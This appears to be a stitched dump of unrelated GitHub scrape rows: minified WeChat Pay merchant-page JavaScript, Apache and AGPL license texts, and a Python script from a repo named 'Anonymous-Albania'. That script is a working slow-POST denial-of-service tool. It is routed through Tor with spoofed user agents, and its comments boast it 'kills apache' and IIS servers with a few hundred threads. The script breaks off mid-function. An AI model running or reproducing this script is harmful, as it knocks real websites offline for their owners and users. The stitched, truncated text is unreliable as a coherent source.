i=0,len=str.length,hash=5381;i<len;++i){hash+=(hash<<5)+str.charAt(i).charCodeAt();};return hash&0x7fffffff;};function $xhrMaker(){var xhr;try{xhr=new XMLHttpRequest();}catch(e){try{xhr=new ActiveXObject(""Msxml2.XMLHTTP"");}catch(e){try{xhr=new ActiveXObject(""Microsoft.XMLHTTP"");}catch(e){xhr=null;}}};return xhr;};$namespace(""MCH.footer"");MCH.footer={searchChildMerchantTimer:\'\',searchChildMerchantName:\'\',protocolDG:\'\',protocolCbx:\'\',protocolBtn:\'\;MCH.footer.init=function(){footerThat=this;footerThat.bind();footerThat.changeVerify();MCH.footer.protocolDG=Common.getPop(\'MchProtocolDG\');MCH.footer.protocolBtn=$(\'#MchProtocolBn\');MCH.footer.protocolCbx=Common.getCbx({id:\'MchProtocolCbx\',onCheck:function(){MCH.footer.protocolBtn.removeClass(\'btn-default\').addClass(\'btn-primary\');},onUnCheck:function(){MCH.footer.protocolBtn.removeClass(\'btn-primary\').addClass(\'btn-default\');}});MCH.footer.checkSignProtocol();};MCH.footer.bind=function(){footerThat.bindChangeCheckimg();footerThat.bindDatepicker();MCH.header.bindCloseDialog();footerThat.bindSelect();$(\'#MchProtocolBn\').on(\'click\',function(){if(MCH.footer.protocolCbx.isCheck()){var postData=Common.getCrsfToken();var ret=false;$ajax({url:\'/index.php/core/merchant/sign_mch_protocol\',data:postData,method:\'post\',type:\'json\',async:false,onSuccess:function(data){MCH.header.handleAjax(data);if(data.errorcode!=0){ret=false;}else{ret=true;}},onError:function(msg){ret=false;}});if(!ret){MCH.header.showErrorAlertDialog(\'Êìç‰ΩúÂ§±Ë¥•,ËØ∑Á®çÂêéÈáçËØï\');}else{MCH.footer.protocolDG.close();}}});};MCH.footer.changeVerify=function(){if($("".img-verify"").size()>0){$("".img-verify"").attr(""src"",""http://captcha.qq.com/getimage?aid=755049101&rd=""+Math.random());}};MCH.footer.bindChangeCheckimg=function(){$("".change-verify"").on(\'click\',function(){footerThat.changeVerify();});$("".checkimg-input"").on(\'keydown\',function(){var value=$(this).val();result=false;if(value.length==4){var token_name=$(""#token"").attr(""name"");var hash=$(""#token"").val();var post_data=token_name+\'=\'+hash+\'&verify_word=\'+value;$ajax({url:\'/index.php/core/home/vaild_checkimg\',data:post_data,method:\'post\',type:\'json\',async:false,onSuccess:function(data){if(data.errorcode==0){result=true;}else{}},onError:function(msg){result=false;}});}});};MCH.footer.bindDatepicker=function(timepicker){if($("".datepicker-input"").size()<=0){return false;}         false?$jqueryUi():\'\';timepicker=timepicker?true:false;var format=\'Y-m-d\';if(timepicker){format=\'Y-m-d H:i\';}         $(\'.datepicker-input\').datetimepicker({defaultTime:\'00:00:00\',step:1,format:format,lang:\'ch\',timepicker:timepicker,yearStart:1970,closeOnDateSelect:true});$(""input.datepicker-input"").next(""i.ico-date"").on(\'click\',function(){$(this).prev(\'input.datepicker-input\').focus();});};MCH.footer.bindSelect=function(){$(""div.dropdown-menu"").on(\'click\',function(){$(this).addClass(\'open\');});$(""ul.dropdown-list"").on(\'click\',\'li\',function(){var value=$(this).children(""a"").attr(\'data-target\');var text=$(this).children(""a"").text();var drop_switch=$(this).parent().prev(""a.dropdown-switch"");drop_switch.attr(\'data-target\',value);drop_switch.children(\'label\').text(text);var id=drop_switch.children(\'label\').attr(\'id\');var name=drop_switch.children(\'label\').html();$(this).parent().parent().removeClass(\'open\');typeof SelectCallBack==\'function\'&&SelectCallBack(id,name);return false;});$(""div.dropdown-menu"").mouseleave(function(){if($(this).hasClass(\'open\')){$(this).removeClass(\'open\');}});};MCH.footer.searchChildMerchant=function(params){var obj=params[\'obj\'];var value=obj.val();if(value!=MCH.footer.searchChildMerchantName){return false;}         var merchants={};var curpage=params[\'curpage\'];var total_page=1;var isAppend=params[\'isAppend\'];var list=obj.parent().parent().children(\'ul.dropdown-list\');if(!isAppend){list.children().remove();}         var token_name=$(""#token"").attr(""name"");var hash=$(""#token"").val();var post_data=token_name+\'=\'+hash+\'&merchant_name=\'+value+\'&page_num=\'+curpage;$ajax({url:\'/index.php/extend/child_merchant/query_merchant_by_name\',data:post_data,method:\'post\',type:\'json\',async:true,onSuccess:function(data){if(data.errorcode==0){merchants=data.data.list;curpage=data.data.curpage;total_page=data.data.total_page;for(var key in merchants){var model=\'<li><a href=""#"" data-target=""\'+key+\'"">\'+merchants[key]+\'</a></li>\';list.append(model);}             if(curpage<total_page){var nextPage=parseInt(curpage,10)+1;var model=\'<dl class=""jsDropDownLiMerchantMore""><a href=""#"" data-target=""\'+nextPage+\'"">Ëé∑ÂèñÊõ¥Â§öÂ≠êÂïÜÊà∑</a></dl>\';list.append(model);}}},onError:function(msg){}});};MCH.footer.checkSignProtocol=function(){var whiteUrl=[\'/index.php/core/home\',\'/index.php/core/apply_progress\',\'/index.php/core/apply_bank\',\'/index.php/core/apply_sign\',\'/index.php/core/merchantupgrading\',\'/index.php/core/submerchant/create_sub_merchant\',\'/index.php/public/cms\'];var localtion=window.location.pathname;prefix=\'/index.php\';if(localtion.substr(0,prefix.length)!=prefix){localtion=prefix+localtion;}         for(var i=0;i<whiteUrl.length;i++){if(localtion.substr(0,whiteUrl[i].length)==whiteUrl[i]){return;}}         var postData=Common.getCrsfToken();$ajax({url:\'/index.php/public/merchant/check_sign_protocol\',data:postData,method:\'post\',type:\'json\',async:true,onSuccess:function(data){MCH.header.handleAjax(data);if(data.errorcode!=0){MCH.footer.protocolDG.open();}},onError:function(msg){}});};MCH.footer.init();     window[\'MCH.footer\']=\'22125:20140422:20161206161027\';     window[\'MCH.footer.time\'] && window[\'MCH.footer.time\'].push(new Date()); </script><!--[if !IE]>|xGv00|f223e6d2e6d5217ac8b233a5d7602c18<![endif]--> <script>TA_STATS_ARGS={}</script> <script type=""text/javascript"" src=""https://tajs.qq.com/res/js/wechatpay.min.js"" charset=""UTF‚àí8""></script> <!-- <script type=""text/javascript"" src=""https://res.wx.qq.com/payactres/zh_CN/htmledition/js/lib/analysis/2.0/lib-min.js"" charset=""UTF‚àí8"" async=""async"" defer=""defer""></script> --> <!--[if !IE]>|xGv00|f5ede3a717a9f61ace3f2ab9101502d0<![endif]--> <!-- Â∫ïÈÉ® ]] --> <script language=""javascript"" src=""https://pingjs.qq.com/tcss.ping.https.js""></script> <script language=""javascript"">     if(typeof(pgvMain) == \'function\')         pgvMain(); </script>   <!--[if !IE]>|xGv00|d554775be84487e94ed910def6bb127d<![endif]--></body></html>",,2
0,https://github.com/admin1i/https---apps.facebook.com-artexas--by_.git,"       Apache License                            Version 2.0, January 2004                         http://www.apache.org/licenses/     TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION     1. Definitions.        ""License"" shall mean the terms and conditions for use, reproduction,       and distribution as defined by Sections 1 through 9 of this document.        ""Licensor"" shall mean the copyright owner or entity authorized by       the copyright owner that is granting the License.        ""Legal Entity"" shall mean the union of the acting entity and all       other entities that control, are controlled by, or are under common       control with that entity. For the purposes of this definition,       ""control"" means (i) the power, direct or indirect, to cause the       direction or management of such entity, whether by contract or       otherwise, or (ii) ownership of fifty percent (50%) or more of the       outstanding shares, or (iii) beneficial ownership of such entity.        ""You"" (or ""Your"") shall mean an individual or Legal Entity       exercising permissions granted by this License.        ""Source"" form shall mean the preferred form for making modifications,       including but not limited to software source code, documentation       source, and configuration files.        ""Object"" form shall mean any form resulting from mechanical       transformation or translation of a Source form, including but       not limited to compiled object code, generated documentation,       and conversions to other media types.        ""Work"" shall mean the work of authorship, whether in Source or       Object form, made available under the License, as indicated by a       copyright notice that is included in or attached to the work       (an example is provided in the Appendix below).        ""Derivative Works"" shall mean any work, whether in Source or Object       form, that is based on (or derived from) the Work and for which the       editorial revisions, annotations, elaborations, or other modifications       represent, as a whole, an original work of authorship. For the purposes       of this License, Derivative Works shall not include works that remain       separable from, or merely link (or bind by name) to the interfaces of,       the Work and Derivative Works thereof.        ""Contribution"" shall mean any work of authorship, including       the original version of the Work and any modifications or additions       to that Work or Derivative Works thereof, that is intentionally       submitted to Licensor for inclusion in the Work by the copyright owner       or by an individual or Legal Entity authorized to submit on behalf of       the copyright owner. For the purposes of this definition, ""submitted""       means any form of electronic, verbal, or written communication sent       to the Licensor or its representatives, including but not limited to       communication on electronic mailing lists, source code control systems,       and issue tracking systems that are managed by, or on behalf of, the       Licensor for the purpose of discussing and improving the Work, but       excluding communication that is conspicuously marked or otherwise       designated in writing by the copyright owner as ""Not a Contribution.""        ""Contributor"" shall mean Licensor and any individual or Legal Entity       on behalf of whom a Contribution has been received by Licensor and       subsequently incorporated within the Work.     2. Grant of Copyright License. Subject to the terms and conditions of       this License, each Contributor hereby grants to You a perpetual,       worldwide, non-exclusive, no-charge, royalty-free, irrevocable       copyright license to reproduce, prepare Derivative Works of,       publicly display, publicly perform, sublicense, and distribute the       Work and such Derivative Works in Source or Object form.     3. Grant of Patent License. Subject to the terms and conditions of       this License, each Contributor hereby grants to You a perpetual,       worldwide, non-exclusive, no-charge, royalty-free, irrevocable       (except as stated in this section) patent license to make, have made,       use, offer to sell, sell, import, and otherwise transfer the Work,       where such license applies only to those patent claims licensable       by such Contributor that are necessarily infringed by their       Contribution(s) alone or by combination of their Contribution(s)       with the Work to which such Contribution(s) was submitted. If You       institute patent litigation against any entity (including a       cross-claim or counterclaim in a lawsuit) alleging that the Work       or a Contribution incorporated within the Work constitutes direct       or contributory patent infringement, then any patent licenses       granted to You under this License for that Work shall terminate       as of the date such litigation is filed.     4. Redistribution. You may reproduce and distribute copies of the       Work or Derivative Works thereof in any medium, with or without       modifications, and in Source or Object form, provided that You       meet the following conditions:        (a) You must give any other recipients of the Work or           Derivative Works a copy of this License; and        (b) You must cause any modified files to carry prominent notices           stating that You changed the files; and        (c) You must retain, in the Source form of any Derivative Works           that You distribute, all copyright, patent, trademark, and           attribution notices from the Source form of the Work,           excluding those notices that do not pertain to any part of           the Derivative Works; and        (d) If the Work includes a ""NOTICE"" text file as part of its           distribution, then any Derivative Works that You distribute must           include a readable copy of the attribution notices contained           within such NOTICE file, excluding those notices that do not           pertain to any part of the Derivative Works, in at least one           of the following places: within a NOTICE text file distributed           as part of the Derivative Works; within the Source form or           documentation, if provided along with the Derivative Works; or,           within a display generated by the Derivative Works, if and           wherever such third-party notices normally appear. The contents           of the NOTICE file are for informational purposes only and           do not modify the License. You may add Your own attribution           notices within Derivative Works that You distribute, alongside           or as an addendum to the NOTICE text from the Work, provided           that such additional attribution notices cannot be construed           as modifying the License.        You may add Your own copyright statement to Your modifications and       may provide additional or different license terms and conditions       for use, reproduction, or distribution of Your modifications, or       for any such Derivative Works as a whole, provided Your use,       reproduction, and distribution of the Work otherwise complies with       the conditions stated in this License.     5. Submission of Contributions. Unless You explicitly state otherwise,       any Contribution intentionally submitted for inclusion in the Work       by You to the Licensor shall be under the terms and conditions of       this License, without any additional terms or conditions.       Notwithstanding the above, nothing herein shall supersede or modify       the terms of any separate license agreement you may have executed       with Licensor regarding such Contributions.     6. Trademarks. This License does not grant permission to use the trade       names, trademarks, service marks, or product names of the Licensor,       except as required for reasonable and customary use in describing the       origin of the Work and reproducing the content of the NOTICE file.     7. Disclaimer of Warranty. Unless required by applicable law or       agreed to in writing, Licensor provides the Work (and each       Contributor provides its Contributions) on an ""AS IS"" BASIS,       WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or       implied, including, without limitation, any warranties or conditions       of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A       PARTICULAR PURPOSE. You are solely responsible for determining the       appropriateness of using or redistributing the Work and assume any       risks associated with Your exercise of permissions under this License.     8. Limitation of Liability. In no event and under no legal theory,       whether in tort (including negligence), contract, or otherwise,       unless required by applicable law (such as deliberate and grossly       negligent acts) or agreed to in writing, shall any Contributor be       liable to You for damages, including any direct, indirect, special,       incidental, or consequential damages of any character arising as a       result of this License or out of the use or inability to use the       Work (including but not limited to damages for loss of goodwill,       work stoppage, computer failure or malfunction, or any and all       other commercial damages or losses), even if such Contributor       has been advised of the possibility of such damages.     9. Accepting Warranty or Additional Liability. While redistributing       the Work or Derivative Works thereof, You may choose to offer,       and charge a fee for, acceptance of support, warranty, indemnity,       or other liability obligations and/or rights consistent with this       License. However, in accepting such obligations, You may act only       on Your own behalf and on Your sole responsibility, not on behalf       of any other Contributor, and only if You agree to indemnify,       defend, and hold each Contributor harmless for any liability       incurred by, or claims asserted against, such Contributor by reason       of your accepting any such warranty or additional liability.     END OF TERMS AND CONDITIONS",,2
0,https://github.com/valmiromeri/Anonymous-Albania.git,"#!/usr/bin/python  # this assumes you have the socks.py (http://phiral.net/socks.py)  # and terminal.py (http://phiral.net/terminal.py) in the # same directory and that you have tor running locally  # on port 9150. run with 128 to 256 threads to be effective. # kills apache 1.X with ~128, apache 2.X / IIS with ~256 # not effective on nginx  import time import sys import random import getopt import socks import string import terminal  from threading import Thread  global stop_now global term  stop_now = False term = terminal.TerminalController()  useragents = [  ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"",  ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"",  ""Googlebot/2.1 (http://www.googlebot.com/bot.html)"",  ""Opera/9.20 (Windows NT 6.0; U; en)"",  ""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"",  ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"",  ""Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0"",  ""Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16"",  ""Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)"", # maybe not  ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13""  ""Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"",  ""Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"",  ""Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)"",  ""Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)"",  ""Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"",  ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8"",  ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7"",  ""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",  ""Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"",  ""YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"" ]   class httpPost(Thread):     def __init__(self, host, port, tor):         Thread.__init__(self)         self.host = host         self.port = port         self.socks = socks.socksocket()         self.tor = tor         self.running = True      def _send_http_post(self, pause=10):         global stop_now          self.socks.send(""POST / HTTP/1.1\\r\\n""                         ""Host: %s\\r\\n""                         ""User-Agent: %s\\r\\n""                         ""Connection: keep-alive\\r\\n""                         ""Keep-Alive: 900\\r\\n""                         ""Content-Length: 10000\\r\\n""                         ""Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n"" %                         (self.host, random.choice(useragents)))          for i in range(0, 9999):             if stop_now:                 self.running = False                 break             p = random.choice(string.letters+string.digits)             print term.BOL+term.UP+term.CLEAR_EOL+""Posting: %s"" % p+term.NORMAL             self.socks.send(p)             time.sleep(random.uniform(0.1, 3))          # self.socks.close()      def run(self):         while self.running:             while self.running:                 try:                     if self.tor:                         self.socks.set_proxy(socks.SOCKS5, \'127.0.0.1\', 9150)                         time.sleep(1)                     self.socks.connect((self.host, self.port))                     print term.BOL+term.UP+term.CLEAR_EOL+""Connected to host...""+ term.NORMAL                     break                 except Exception, e:                     print term.BOL+term.UP+term.CLEAR_EOL+""Error connecting to host",,2
0,https://github.com/minecraft77/blk-stealthspider.git,"                    GNU AFFERO GENERAL PUBLIC LICENSE                        Version 3, 19 November 2007   Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU Affero General Public License is a free, copyleft license for software and other kinds of works, specifically designed to ensure cooperation with the community in the case of network server software.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, our General Public Licenses are intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    Developers that use our General Public Licenses protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License which gives you legal permission to copy, distribute and/or modify the software.    A secondary benefit of defending all users\' freedom is that improvements made in alternate versions of the program, if they receive widespread use, become available for other developers to incorporate.  Many developers of free software are heartened and encouraged by the resulting cooperation.  However, in the case of software used on network servers, this result may fail to come about. The GNU General Public License permits making a modified version and letting the public access it on a server without ever releasing its source code to the public.    The GNU Affero General Public License is designed specifically to ensure that, in such cases, the modified source code becomes available to the community.  It requires the operator of a network server to provide the source code of the modified version running there to the users of that server.  Therefore, public use of a modified version, on a publicly accessible server, gives the public access to the source code of the modified version.    An older license, called the Affero General Public License and published by Affero, was designed to accomplish similar goals.  This is a different license, not a version of the Affero GPL, but Affero has released a new version of the Affero GPL which permits relicensing under this license.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU Affero General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License 